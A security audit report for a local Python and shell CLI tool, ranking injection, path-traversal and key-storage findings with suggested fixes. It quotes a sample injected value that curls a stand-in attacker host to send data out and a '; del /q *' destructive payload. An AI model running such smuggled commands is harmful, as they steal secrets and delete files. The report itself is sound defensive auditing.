# Security Audit Report

**Date:** 2025-03-12  
**Scope:** devloop-ai codebase (Python CLI tools, shell scripts)

---

## Executive Summary

This audit analyzed input validation, authentication/authorization, data exposure, injection vulnerabilities, and dependency risks. The codebase is a **local CLI tool** (not a network service), which reduces attack surface. Several issues were identified and ranked by severity.

---

## Risk Findings (Severity Ranked)

### HIGH

#### 1. Command injection via API key in setup script

**Severity:** High  
**Affected files:** `scripts/setup.sh`

**Issue:** User-entered `LINEAR_KEY` is expanded when building the config block. If the value contains shell metacharacters (e.g. `$(malicious_command)` or backticks), they are executed during script run.

```bash
# Current (vulnerable):
export LINEAR_API_KEY=\"$LINEAR_KEY\"
# If LINEAR_KEY='$(curl attacker.com/exfil?k=)' → command runs
```

**Recommended fix:** Avoid expanding user input in the block. Use single-quotes or escape special characters:

```bash
# Option A: Use single quotes (no expansion)
printf -v LINEAR_ESCAPED '%q' "$LINEAR_KEY"
BLOCK="$BLOCK
export LINEAR_API_KEY=$LINEAR_ESCAPED
export LINEAR_READY_STATE=\"Ready for build\"
"
```

Or write the key to a separate `.env` file and source it, avoiding inline expansion.

---

#### 2. `shell=True` with user-controlled path (Windows)

**Severity:** High (context-dependent)  
**Affected files:** `ai/platform_utils.py` (lines 124, 126)

**Issue:** On Windows fallback, `subprocess.Popen(["cursor", path], shell=True)` passes the path to the shell. If `path` (from `cwd`) contains shell metacharacters (e.g. `; del /q *`), they could be interpreted.

```python
# Vulnerable:
subprocess.Popen(["cursor", path], shell=True)
subprocess.Popen(["start", "", "cursor", path], shell=True)
```

**Recommended fix:** Avoid `shell=True`. Use `subprocess.run` with list args, or use `shlex.quote` if shell is required:

```python
# Prefer no shell:
subprocess.Popen(["cmd", "/c", "start", "", "cursor", path])
# Or ensure path is safe before using shell
```

---

### MEDIUM

#### 3. Path traversal via `--prompts-dir`

**Severity:** Medium  
**Affected files:** `ai/ws_create.py` (lines 96–97, 121)

**Issue:** `--prompts-dir` is user-controlled and used directly to read files. A path like `../../etc` or `/etc` could read arbitrary files.

```python
prompts_dir = Path(args.prompts_dir)  # No validation
orch_path = prompts_dir / orch_file
orch_prompt = read_text(orch_path)   # Reads arbitrary path
```

**Recommended fix:** Resolve to a real path and ensure it stays under an allowed base:

```python
base = Path(PROMPTS_DIR_DEFAULT).resolve()
prompts_dir = (Path(args.prompts_dir) / "").resolve()
if not str(prompts_dir).startswith(str(base)) and prompts_dir != base:
    # Reject if outside expected tree
    sys.exit("--prompts-dir must be under prompt directory")
```

Or restrict to a whitelist of known subdirs.

---

#### 4. API key stored in shell profile

**Severity:** Medium  
**Affected files:** `scripts/setup.sh`, `scripts/setup.ps1`

**Issue:** `LINEAR_API_KEY` is written to `~/.zshrc` / `~/.bashrc` / PowerShell profile. Keys in plain text can be exposed via process listing, backups, or shared machines.

**Recommended fix:** Document use of a secrets manager or `.env` (gitignored) and avoid storing keys in shell config. If kept, add a warning in setup output.

---

### LOW

#### 5. Unbounded `--limit` in ai-list

**Severity:** Low  
**Affected files:** `ai/ai_list.py` (line 57)

**Issue:** `--limit` accepts any integer. Very large values (e.g. `--limit 999999`) could stress the Linear API or cause memory issues.

**Recommended fix:** Clamp the value:

```python
args.add_argument("--limit", type=int, default=25, help="...")
# After parse:
args.limit = max(1, min(args.limit, 100))
```

---

#### 6. Unvalidated `--state` filter

**Severity:** Low  
**Affected files:** `ai/ai_list.py` (line 68)

**Issue:** `args.state` is passed directly to the GraphQL filter. Invalid or unexpected values may cause API errors or odd behavior.

**Recommended fix:** Validate against known states or allow free-form but document behavior. Optional: fetch team states and validate.

---

#### 7. PowerShell API key injection (setup.ps1)

**Severity:** Low–Medium  
**Affected files:** `scripts/setup.ps1` (lines 90–92)

**Issue:** `$LinearKey` is interpolated into a double-quoted string. A value containing `"` could break the string and inject PowerShell code.

**Recommended fix:** Escape or use a safe encoding:

```powershell
$LinearKeyEscaped = $LinearKey -replace '"', '""'
$Block += "`$env:LINEAR_API_KEY = `"$LinearKeyEscaped`""
```

---

### INFORMATIONAL

#### 8. Subprocess usage (generally safe)

**Status:** OK  
**Files:** `ai/ai_go.py`, `ai/ai_pr.py`, `ai/ai_linear_create.py`, etc.

**Note:** Most subprocess calls use list arguments (no `shell=True`), which prevents shell injection. `linear-cli` and `gh` invocations pass user data as separate list elements and are safe.

---

#### 9. GraphQL queries

**Status:** OK  
**Files:** `ai/linear_utils.py`

**Note:** Queries use parameterized variables (`$teamKey`, `$number`, etc.), avoiding GraphQL injection.

---

#### 10. Dependencies

**Status:** OK  
**Files:** `requirements.txt`, `requirements-dev.txt`

**Note:** `pyperclip>=1.8.2` has no known CVEs. `pytest` and `pytest-mock` are dev-only. Consider pinning versions for reproducibility.

---

## Summary Table

| # | Severity | Issue                          | File(s)              |
|---|----------|--------------------------------|----------------------|
| 1 | High     | Command injection in setup.sh  | scripts/setup.sh     |
| 2 | High     | shell=True with path (Windows) | ai/platform_utils.py |
| 3 | Medium   | Path traversal --prompts-dir    | ai/ws_create.py      |
| 4 | Medium   | API key in shell profile       | scripts/setup.*      |
| 5 | Low      | Unbounded --limit              | ai/ai_list.py        |
| 6 | Low      | Unvalidated --state            | ai/ai_list.py        |
| 7 | Low      | PowerShell key injection       | scripts/setup.ps1    |

---

## Recommended Minimal Fixes (Priority Order)

1. **setup.sh:** Sanitize or safely quote `LINEAR_KEY` before writing (e.g. `printf '%q'` or equivalent).
2. **platform_utils.py:** Remove `shell=True` on Windows or use a safe invocation pattern.
3. **ws_create.py:** Validate and constrain `--prompts-dir` to prevent path traversal.
4. **ai_list.py:** Clamp `--limit` (e.g. 1–100).
5. **setup.ps1:** Escape `$LinearKey` when building the profile block.

---

## Authentication & Authorization

- **Authentication:** Linear API key via `LINEAR_API_KEY`. No local auth; tools assume trusted user.
- **Authorization:** Linear API enforces permissions. No additional app-level checks.
- **Data exposure:** API key is not logged. Error messages may include API responses; ensure no secrets in verbose output.

---

## Next Steps

1. Apply the minimal fixes above.
2. Add a `.env.example` and document secure key handling.
3. Consider running `pip audit` or `safety check` in CI for dependency scanning.
4. Add a semgrep or similar SAST step if available in the environment.
